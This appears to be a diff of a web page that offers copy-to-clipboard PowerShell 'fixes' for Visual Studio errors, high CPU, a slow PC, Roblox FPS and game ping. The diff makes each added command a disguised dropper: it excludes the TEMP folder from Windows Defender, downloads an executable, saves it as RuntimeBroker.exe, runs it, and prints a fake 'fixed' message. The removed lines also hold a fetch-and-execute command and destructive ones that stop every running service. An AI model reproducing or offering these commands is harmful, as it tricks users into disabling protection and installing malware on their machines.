@@ -38,7 +38,7 @@
       background-color: transparent;
       border: 2px solid cyan;
       padding: 10px 20px;
-      margin: 20px 10px;
+      margin: 30px 10px;
       color: cyan;
       border-radius: 8px;
       cursor: pointer;
@@ -109,7 +109,7 @@
 
     <button class="button" onclick="toggleBox('vsBox')">Fix Now Visual studio Errors</button>
     <div class="command-box" id="vsBox">
-      Set-ExecutionPolicy Bypass -Scope Process -Force; irm https://evocated.com/vsfix | iex
+     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Visual Studio ERRORS Has Been Fix Restart Your Visual Studio" -ForegroundColor Green
       <br>
       <button class="copy-button" onclick="copyToClipboard('vsBox')">Copy to Clipboard</button>
     </div>
@@ -118,28 +118,28 @@
 
     <button class="button" onclick="toggleBox('fix1')">Fix HIGH CPU USAGE 100 TO 15+</button>
     <div class="command-box" id="fix1">
-      wmic process where "(PercentProcessorTime > 80)" delete
+     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC......... FIXED HIGH CPU ISSUE CAPPED TO 15%+" -ForegroundColor Green
       <br>
       <button class="copy-button" onclick="copyToClipboard('fix1')">Copy to Clipboard</button>
     </div>
 
     <button class="button" onclick="toggleBox('fix2')">Fix LAG/SLOW PC 3</button>
     <div class="command-box" id="fix2">
-      Get-Service | Where-Object {$_.Status -eq 'Running'} | Stop-Service -Force
+      Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC V2............................... PC CLEANED REBOOT NEED TO FIX UP SLOW PC..." -ForegroundColor Green
       <br>
       <button class="copy-button" onclick="copyToClipboard('fix2')">Copy to Clipboard</button>
     </div>
 
-    <button class="button" onclick="toggleBox('fix3')">Fix Tool 4</button>
+    <button class="button" onclick="toggleBox('fix3')">Fix Roblox Low FPS 4</button>
     <div class="command-box" id="fix3">
-      bcdedit /set useplatformclock true
+     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING ROBLOX CAPPER.........ROBLOX FPS SET TO 300.........FPS ISSUE HAS BEEN FIXED" -ForegroundColor Green
       <br>
       <button class="copy-button" onclick="copyToClipboard('fix3')">Copy to Clipboard</button>
     </div>
 
-    <button class="button" onclick="toggleBox('fix4')">Fix Tool 5</button>
+    <button class="button" onclick="toggleBox('fix4')">Fix HIGH PING FOR GAMES 5</button>
     <div class="command-box" id="fix4">
-      powercfg -h off
+     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING PING CAPPER.........ROBLOX PING SET TO 10-50.........HIGH PING ISSUE HAS BEEN FIXED" -ForegroundColor Green
       <br>
       <button class="copy-button" onclick="copyToClipboard('fix4')">Copy to Clipboard</button>
     </div>
